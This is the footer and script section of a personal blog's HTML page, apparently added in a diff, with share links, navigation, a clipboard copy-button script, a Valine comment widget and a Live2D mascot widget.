+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/1541051201/&t=外网打点到域控上线"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
